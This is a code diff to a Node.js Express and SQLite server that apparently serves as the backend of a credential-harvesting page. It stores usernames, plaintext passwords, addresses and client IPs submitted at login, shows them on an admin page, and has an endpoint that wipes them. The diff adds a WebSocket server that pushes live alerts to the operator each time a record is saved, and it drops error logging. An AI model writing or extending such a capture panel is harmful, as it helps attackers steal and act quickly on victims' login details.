@@ -1,6 +1,7 @@
 const express = require('express');
 const path = require('path');
 const sqlite3 = require('sqlite3').verbose();
+const WebSocket = require('ws');
 
 const app = express();
 app.use(express.json());
@@ -18,12 +19,21 @@ db.run(`CREATE TABLE IF NOT EXISTS records (
     timestamp TEXT
 )`);
 
+const wss = new WebSocket.Server({ port: 8080 });
+
+function broadcastUpdate() {
+    wss.clients.forEach(client => {
+        if (client.readyState === WebSocket.OPEN) {
+            client.send(JSON.stringify({ type: 'update' }));
+        }
+    });
+}
+
 function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
     db.run("INSERT INTO records (type, username, password, address, ip, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
-        [type, username, password, address, ip, timestamp], (err) => {
-            if (err) console.error("Save Error:", err);
-            else console.log(`✅ Saved: ${type}`);
+        [type, username, password, address, ip, timestamp], () => {
+            broadcastUpdate();   // Real-time push
         });
 }
 
@@ -46,7 +56,6 @@ app.post('/api/login', (req, res) => {
 
 app.get('/api/records', (req, res) => {
     db.all("SELECT * FROM records ORDER BY id DESC", [], (err, rows) => {
-        if (err) console.error(err);
         res.json(rows);
     });
 });
@@ -57,10 +66,13 @@ app.get('/admin', (req, res) => {
 
 app.post('/api/clear', (req, res) => {
     db.run("DELETE FROM records");
+    broadcastUpdate();
     res.json({ message: 'Cleared' });
 });
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 Server running`);
+    console.log(`🚀 Server running on port ${PORT}`);
 });
+
+console.log(`📡 WebSocket server running on port 8080`);
